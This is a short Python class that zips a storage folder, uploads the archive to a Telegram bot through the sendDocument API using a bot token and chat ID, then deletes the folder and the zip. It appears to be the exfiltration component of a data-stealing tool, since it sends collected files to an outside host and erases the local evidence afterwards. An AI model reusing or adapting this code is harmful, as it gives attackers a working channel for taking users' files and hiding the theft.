import requests

from os import remove
from shutil import make_archive, rmtree


class Sender:

    def __init__(self, zip_name: str, storage_path: str, storage_folder: str, token: str, user_id: int):

        self.zip_name = zip_name
        self.storage_path = storage_path
        self.storage_folder = storage_folder

        self.token = token
        self.user_id = user_id

    def __create_archive(self):

        make_archive(f"{self.storage_path}{self.zip_name}", 'zip', f"{self.storage_path}{self.storage_folder}")

    def __send_archive(self):

        with open(f"{self.storage_path}{self.zip_name}.zip", 'rb') as file:

            requests.post(
                url=f"https://api.telegram.org/bot{self.token}/sendDocument",
                data={
                    'chat_id': self.user_id
                },
                files={
                    'document': file
                }
            )

        file.close()

    def __delete_files(self):

        rmtree(f"{self.storage_path}{self.storage_folder}")
        remove(f"{self.storage_path}{self.zip_name}.zip")

    def run(self):

        self.__create_archive()
        self.__send_archive()
        self.__delete_files()
